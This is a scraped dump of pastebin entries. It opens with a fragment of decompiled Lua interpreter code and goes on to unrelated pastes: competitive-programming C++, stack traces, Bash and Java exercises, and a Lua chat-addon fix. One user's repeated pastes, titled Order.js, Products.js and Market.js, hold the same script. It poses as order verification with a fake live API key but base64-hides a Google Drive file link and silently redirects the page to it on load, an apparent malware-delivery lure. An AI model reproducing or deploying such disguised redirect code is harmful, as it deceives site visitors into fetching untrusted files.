        v146 = v365 + 80;
        v147 = *((_DWORD *)v365 + 9);
        v148 = *((_DWORD *)v365 + 10);
        v149 = *((_DWORD *)v365 + 11);
        *((_DWORD *)v365 + 20) = *((_DWORD *)v365 + 8);
        *((_DWORD *)v146 + 1) = v147;
        *((_DWORD *)v146 + 2) = v148;
        *((_DWORD *)v146 + 3) = v149;
        v213 = v215 + 16;
        v150 = v215 + 16;
        v151 = *((_DWORD *)v365 + 5);
        v152 = *((_DWORD *)v365 + 6);
        v153 = *((_DWORD *)v365 + 7);
        *((_DWORD *)v215 + 4) = *((_DWORD *)v365 + 4);
        *((_DWORD *)v150 + 1) = v151;
        *((_DWORD *)v150 + 2) = v152;
        *((_DWORD *)v150 + 3) = v153;
        v212 = v215;
        v154 = v215;
        v155 = *((_DWORD *)v365 + 1);
        v156 = *((_DWORD *)v365 + 2);
        v157 = *((_DWORD *)v365 + 3);
        *(_DWORD *)v215 = *(_DWORD *)v365;
        *((_DWORD *)v154 + 1) = v155;
        *((_DWORD *)v154 + 2) = v156;
        *((_DWORD *)v154 + 3) = v157;
        a1[3] = (int)(v215 + 48);
        luaD_call((int)a1, v215, (v366 >> 14) & 0x1FF);
        v367 = *(_DWORD *)(v368 + 16);
        a1[3] = *(_DWORD *)(v368 + 4);
        v158 = *(int **)(v368 + 20);
        *(_DWORD *)(v368 + 20) = v158 + 1;
        v366 = *v158;
        v365 = (char *)(v367 + 16 * (unsigned __int8)(v366 >> 6));
        goto LABEL_475;
      case 42u:
LABEL_475:
        if ( *((_DWORD *)v365 + 6) )
        {
          v211 = v365;
          v159 = v365;
          v160 = *((_DWORD *)v365 + 5);
          v161 = *((_DWORD *)v365 + 6);
          v162 = *((_DWORD *)v365 + 7);
          *(_DWORD *)v365 = *((_DWORD *)v365 + 4);
          *((_DWORD *)v159 + 1) = v160;
          *((_DWORD *)v159 + 2) = v161;
          *((_DWORD *)v159 + 3) = v162;
          *(_DWORD *)(v368 + 20) += 4 * ((v366 >> 14) + 1073610753);
        }
        continue;
      case 43u:
        v356 = v366 >> 23;
        v355 = (v366 >> 14) & 0x1FF;
        if ( !(v366 >> 23) )
          v356 = ((a1[3] - (int)v365) >> 4) - 1;
        if ( !v355 )
        {
          v163 = *(_DWORD **)(v368 + 20);
          *(_DWORD *)(v368 + 20) = v163 + 1;
          v355 = *v163 >> 6;
        }
        v210 = *(_DWORD *)v365;
        v354 = 50 * (v355 - 1) + v356;
        if ( *(_DWORD *)(v210 + 8) < v354 )
          sub_74D5094(a1, v210, v354);
        while ( v356 > 0 )
        {
          v209 = &v365[16 * v356];
          v164 = v354--;
          ((void (__fastcall *)(int *, int, int, _DWORD, char *))luaH_setint)(a1, v210, v164, 0, v209);
          if ( (*((_DWORD *)v209 + 2) & 0x40) != 0
            && (*(_BYTE *)(v210 + 5) & 4) != 0
            && (*(_BYTE *)(*(_DWORD *)v209 + 5) & 3) != 0 )
          {
            sub_74C31BC(a1, v210);
          }
          --v356;
        }
        a1[3] = *(_DWORD *)(v368 + 4);
        continue;
      case 44u:
        v208 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v350 + 12) + 56) + 4 * (v366 >> 14));
        v207 = sub_74D9754(v208, v350 + 16, v367);
        if ( v207 )
        {
          v206 = v365;
          v205 = v207;
          *(_DWORD *)v365 = v207;
          *((_DWORD *)v206 + 2) = 70;
        }
        else
        {
          sub_74D986C((int)a1, v208, v350 + 16, v367, (int *)v365);
        }
        if ( *(int *)(a1[4] + 12) > 0 )
        {
          a1[3] = (int)(v365 + 16);
          sub_74C61D0(a1);
          a1[3] = *(_DWORD *)(v368 + 4);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 45u:
        v353 = (v366 >> 23) - 1;
        v351 = ((v367 - *(_DWORD *)v368) >> 4) - *(unsigned __int8 *)(*(_DWORD *)(v350 + 12) + 6) - 1;
        if ( v351 < 0 )
          v351 = 0;
        if ( v353 < 0 )
        {
          v353 = v351;
          if ( (a1[7] - a1[3]) >> 4 <= v351 )
            sub_74C0078(a1, v351);
          v367 = *(_DWORD *)(v368 + 16);
          v365 = (char *)(v367 + 16 * (unsigned __int8)(v366 >> 6));
          a1[3] = (int)&v365[16 * v351];
        }
        for ( j = 0; j < v353 && j < v351; ++j )
        {
          v204 = &v365[16 * j];
          v165 = (int *)(v367 + 16 * (j - v351));
          v166 = v204;
          v167 = *v165;
          v168 = v165[1];
          v169 = v165[2];
          v170 = v165[3];
          *(_DWORD *)v204 = v167;
          *((_DWORD *)v166 + 1) = v168;
          *((_DWORD *)v166 + 2) = v169;
          *((_DWORD *)v166 + 3) = v170;
        }
        while ( j < v353 )
          *(_DWORD *)&v365[16 * j++ + 8] = 0;
        continue;
      default:
        continue;
    }
  }
}"
Djw9WRf1,Untitled,Epiphemeral,JavaScript,Tuesday 15th of April 2025 10:42:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34643/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YB2zubGN,WA T6: https://codeforces.com/gym/105679/problem/E,shohagfaraji,C++,Tuesday 15th of April 2025 10:33:32 AM CDT,"#include<bits/stdc++.h>
#define ll long long
using namespace std;

void f (vector<int>&a, int n, int p, int c, int l, int r) {
  int i = p + c, lim = (c < 0 ? 1 : n);
  while (i != lim + c) {
    if (l >= 1) {
      a[i] = l;
      l--;
    } else if (r <= n) {
      a[i] = r;
      r++;
    } else break;
    i += c;
  }
  c = (c < 0 ? 1 : -1);
  lim = (c < 0 ? 1 : n);
  i = p + c;
  while (i != lim + c) {
    if (l >= 1) {
      a[i] = l;
      l--;
    } else if (r <= n) {
      a[i] = r;
      r++;
    } else break;
    i += c;
  }
}

//10 7 3
//Yes
//7 6 5 4 1 2 3 8 9 10

void Solve() {
  int n, x, y;
  cin >> n >> x >> y;
  if (y < x) {
    cout << ""No"";
    return;
  }
  cout << ""Yes"" << endl;
  vector<int> a (n + 1);
  a[x] = y;
  f (a, n, x, -1, y - 1, y + 1);
  cout << a[1];
  for (int i = 2 ; i <= n ; i++) {
    cout << "" "" << a[i];
  }
}

int main() {
  ios_base::sync_with_stdio (false);
  cin.tie (0);
  int ts = 1;
  while (ts--) {
    Solve();
    cout << endl;
  }
  return 0;
}
"
JdCMt1S3,WA T26: https://codeforces.com/gym/105679/problem/E,shohagfaraji,C++,Tuesday 15th of April 2025 10:30:34 AM CDT,"#include<bits/stdc++.h>
#define ll long long
using namespace std;

void f (vector<int>&a, int n, int p, int c, int l, int r) {
  int i = p + c, lim = (c < 0 ? 1 : n);
  while (i != lim + c) {
    if (l >= 1) {
      a[i] = l;
      l--;
    } else if (r <= n) {
      a[i] = r;
      r++;
    } else break;
    i += c;
  }
  c = (c < 0 ? 1 : -1);
  lim = (c < 0 ? 1 : n);
  i = p + c;
  while (i != lim + c) {
    if (l >= 1) {
      a[i] = l;
      l--;
    } else if (r <= n) {
      a[i] = r;
      r++;
    } else break;
    i += c;
  }
}

void Solve() {
  int n, x, y;
  cin >> n >> x >> y;
  if (x == n && (y > 1 && y < n) ) {
    cout << ""No"";
    return;
  }
  cout << ""Yes"" << endl;
  vector<int> a (n + 1);
  a[x] = y;
  f (a, n, x, -1, y - 1, y + 1);
  cout << a[1];
  for (int i = 2 ; i <= n ; i++){
    cout << "" "" << a[i];
  }
}

int main() {
  ios_base::sync_with_stdio (false);
  cin.tie (0);
  int ts = 1;
  while (ts--) {
    Solve();
    cout << endl;
  }
  return 0;
}
"
XJhUkCzL,Products.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 10:26:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83397/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
m5ZY3bUL,Error Message,nick2808,Bash,Tuesday 15th of April 2025 10:18:34 AM CDT,"raceback (most recent call last):
  File ""/home/zenin/.local/lib/python3.13/site-packages/spotipy/oauth2.py"", line 232, in _request_access_token
    response.raise_for_status()
    ~~~~~~~~~~~~~~~~~~~~~~~~~^^
  File ""/home/zenin/.local/lib/python3.13/site-packages/requests/models.py"", line 1024, in raise_for_status
    raise HTTPError(http_error_msg, response=self)
requests.exceptions.HTTPError: 400 Client Error: Bad Request for url: https://accounts.spotify.com/api/token

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""/usr/bin/beatprints"", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File ""/usr/lib/python3.13/site-packages/cli/prompt.py"", line 259, in main
    create_poster()
    ~~~~~~~~~~~~~^^
  File ""/usr/lib/python3.13/site-packages/cli/prompt.py"", line 249, in create_poster
    album = select_album(conf.SEARCH_LIMIT)
  File ""/usr/lib/python3.13/site-packages/cli/prompt.py"", line 93, in select_album
    result = sp.get_album(query, limit, shuffle)
  File ""/usr/lib/python3.13/site-packages/BeatPrints/spotify.py"", line 200, in get_album
    result = self.spotify.search(q=query, type=""album"", limit=limit)
  File ""/home/zenin/.local/lib/python3.13/site-packages/spotipy/client.py"", line 604, in search
    return self._get(
           ~~~~~~~~~^
        ""search"", q=q, limit=limit, offset=offset, type=type, market=market
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    )
    ^
  File ""/home/zenin/.local/lib/python3.13/site-packages/spotipy/client.py"", line 324, in _get
    return self._internal_call(""GET"", url, payload, kwargs)
           ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/zenin/.local/lib/python3.13/site-packages/spotipy/client.py"", line 250, in _internal_call
    headers = self._auth_headers()
  File ""/home/zenin/.local/lib/python3.13/site-packages/spotipy/client.py"", line 241, in _auth_headers
    token = self.auth_manager.get_access_token(as_dict=False)
  File ""/home/zenin/.local/lib/python3.13/site-packages/spotipy/oauth2.py"", line 207, in get_access_token
    token_info = self._request_access_token()
  File ""/home/zenin/.local/lib/python3.13/site-packages/spotipy/oauth2.py"", line 236, in _request_access_token
    self._handle_oauth_error(http_error)
    ~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^
  File ""/home/zenin/.local/lib/python3.13/site-packages/spotipy/oauth2.py"", line 117, in _handle_oauth_error
    raise SpotifyOauthError(
    ...<3 lines>...
    )
spotipy.exceptions.SpotifyOauthError: error: invalid_client, error_description: None"
we0xFbk8,Order.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 10:10:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05742/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1TsvZzdr,Market.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 09:55:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91073/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fkY2P0Lz,Untitled,Epiphemeral,JavaScript,Tuesday 15th of April 2025 09:40:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39682/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dVaKB9aR,EC failed hot-refresh fix,Aoki1337,Lua,Tuesday 15th of April 2025 09:38:46 AM CDT,"local EC_PRESERVE_MESSAGE_IN_PROGRESS = GetConVar(""easychat_preserve_message_in_progress"")
local PANEL = EasyChat.GUI.TextEntry
local self = EasyChat.GUI.TextEntry

PANEL.ValueInProgress = """"

self:AddInternalCallback(""OnArrowUp"", function(caret_pos)
	self.CaretPos = caret_pos

	if EC_PRESERVE_MESSAGE_IN_PROGRESS:GetBool() and self.HistoryPos == 0 then
		local textInProgress = self:GetTextInProgress()

		if textInProgress and #textInProgress ~= 0 and self:GetText() ~= textInProgress then
			-- bring back message in progress
			self:SetText(textInProgress)
			self:OnChange()
			self:OnValueChange(textInProgress)
			return
		end
	end

	self.HistoryPos = self.HistoryPos - 1
	self:UpdateFromHistory()
end)

self:AddInternalCallback(""OnEnter"", function(caret_pos)
	if input.IsKeyDown(KEY_LSHIFT) or input.IsKeyDown(KEY_RSHIFT) then return end

	self:SetTextInProgress("""")

	self.CaretPos = caret_pos
	self:AddHistory(self:GetText())
	self.HistoryPos = 0

	self:OnEnter()
end)

function PANEL:GetTextInProgress()
	return self.ValueInProgress
end
PANEL.GetValueInProgress = PANEL.GetTextInProgress

function PANEL:SetTextInProgress(text)
	self.ValueInProgress = text
end
PANEL.SetValueInProgress = PANEL.SetTextInProgress
"
3Ek0ypz1,apt_manager.sh,sergio_educacionit,Bash,Tuesday 15th of April 2025 09:31:48 AM CDT,"#!/bin/bash

func_yesnoexit () {
	
	# las variables locales existen solo
	# dentro de la funcion
	
	local answer=""$1""

	if [ $answer == ""y"" ] || [ $answer == ""Y"" ];then

		return 0

	elif [ $answer == ""n"" ] || [ $answer == ""N"" ];then

		return 1

	else
	
		echo Terminado.
		exit 1
	
	fi

}


apt update

read -p ""
Actualizar sistema?
'y/n' cualquier tecla para terminar.
"" sel

if func_yesnoexit $sel; then

	apt upgrade -y

fi


read -p ""
Resolver dependencias?
'y/n' cualquier tecla para terminar.
"" sel

if func_yesnoexit $sel; then

	apt intall -f -y

fi



read -p ""
Eliminar paquetes huerfanos?
'y/n' cualquier tecla para terminar.
"" sel

if func_yesnoexit $sel; then

	apt autoremove -f -y

fi

echo ""
Programa terminado.
""
"
0yTVQTpi,Products.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 09:24:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/07778/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SiqrJqTV,Order.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 09:08:34 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55760/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
QQtTfw6x,elif.sh,sergio_educacionit,Bash,Tuesday 15th of April 2025 08:59:05 AM CDT,"#!/bin/bash



read -p ""Elija una opcion:

	1) opcion 1
	2) opcion 2
"" x 


if [ ""$x"" -eq 1 ]; then

    echo ""opcion 1""

elif [ ""$x"" -eq 2 ]; then

    echo ""opcion 2""

else
    echo ""debe elegir opcion 1 o 2""

fi"
SyAHvBvc,Market.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 08:52:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42652/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VPWdsMUj,Untitled,Epiphemeral,JavaScript,Tuesday 15th of April 2025 08:37:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12517/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WRZVaJMU,Products.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 08:21:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55122/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
54m5TivE,Order.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 08:05:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26218/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CzzBagfR,2025-04-15T18:04:31.990215,powerampache,PHP,Tuesday 15th of April 2025 08:04:34 AM CDT,"1.01-79 (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.ScrobbleException: {""errorAction"":""record_play"",""errorCode"":""4701"",""errorMessage"":""Session Expired"",""errorType"":""account""}
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.scrobbleApiCall(SongsRepositoryImpl.kt:652)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.access$scrobbleApiCall(SongsRepositoryImpl.kt:80)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$scrobbleApiCall$1.invokeSuspend(Unknown Source:15)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:942)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.app.ActivityThread.main(ActivityThread.java:7983)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:860)

scrobble() - "
V8FUAwkZ,java实验六,wyx0311,Java,Tuesday 15th of April 2025 08:01:46 AM CDT,"package org.example;
import java.io.*;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) throws IOException {
        String source_filename = ""D://Hello.txt"";
        String target_filename = ""D://Hello.txt"";

        System.out.println(""请输入源文件地址 "");
        source_filename = ( new Scanner(System.in)).nextLine();
        System.out.println(""请输入目标文件地址 "");
        target_filename = ( new Scanner(System.in)).nextLine();


        FileReader fr = new FileReader(source_filename);
        BufferedReader br = new BufferedReader(fr);

        FileWriter fw = new FileWriter(target_filename, true);
        BufferedWriter bw = new BufferedWriter(fw);




        String line;
        while((line = br.readLine())!=null){
            bw.write(line);
            bw.newLine();
            System.out.println(line);
        }

        bw.flush();

        br.close();
        fr.close();
        bw.close();
        fw.close();
    }
}"
8n9SacZ0,Market.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 07:50:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51293/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fVzZ1Een,Untitled,Epiphemeral,JavaScript,Tuesday 15th of April 2025 07:34:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/36714/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
